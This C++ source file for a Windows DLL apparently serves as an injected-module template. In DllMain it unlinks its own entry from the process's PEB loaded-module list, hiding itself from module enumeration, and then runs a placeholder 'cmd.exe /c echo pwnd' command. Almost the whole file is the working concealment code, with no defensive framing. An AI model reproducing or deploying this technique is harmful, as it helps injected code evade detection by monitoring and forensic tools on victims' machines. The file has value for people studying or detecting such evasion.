#include "pch.h"
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>
#include <psapi.h>

#pragma comment(lib, "ShLwApi.lib")


//function prototypes
void WINAPI DelteDllFromPEB(HMODULE hModule);
int CompareUnicodeStrings(WCHAR* substring, WCHAR* bigstring);



BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DelteDllFromPEB(hModule);
		system("cmd.exe /c \"echo pwnd\"");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



void DelteDllFromPEB(HMODULE hModule) {

	HANDLE current_process_handle = GetCurrentProcess();
	WCHAR module_name[MAX_PATH];
	GetModuleBaseNameW(current_process_handle, hModule, module_name, _countof(module_name));

// Getting the offeset of PTR_PEB from the start of TEB
#ifdef _M_IX86 
	PPEB ProcEnvBlk = (PPEB)__readfsdword(0x30);
#else
	PPEB ProcEnvBlk = (PPEB)__readgsqword(0x60);
#endif

	// Finding the address of the Head node of the Link list, which represents all the models that are loaded into our process.
	PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr; 
	LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

	// Iterating to the next node. This will be our starting point.
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;

	// Iterating through the linked list.
	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) 
	{
		// Getting the address of current LDR_DATA_TABLE_ENTRY (whic represents the DLL).
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		// Checking if this is the injected DLL
		if (CompareUnicodeStrings(module_name, pEntry->FullDllName.Buffer))
		{
			// Detaching the node from the PEB
			pListEntry->Blink->Flink = pListEntry->Flink;
			pListEntry->Flink->Blink = pListEntry->Blink;
		}
	}
}


/// <summary>
/// The method takes to UNICODE strings: 
///		[+] substring - The DLL name we are searching for, exactly as we wrote it.
///     [+] bigstring - The DLL name as its written in the PEB
/// 
/// Turns both strings to lowercase, and searches the substring in the bigstring.
/// </summary>
int CompareUnicodeStrings(WCHAR* substring, WCHAR* bigstring)
{
	int substring_len = wcslen(substring);
	int bigstring_len = wcslen(bigstring);

	_wcslwr_s(substring, substring_len + 1);
	_wcslwr_s(bigstring, bigstring_len + 1);

	int result = 0;
	if (StrStrW(bigstring, substring) != NULL)
	{
		result = 1;
	}

	return result;
}

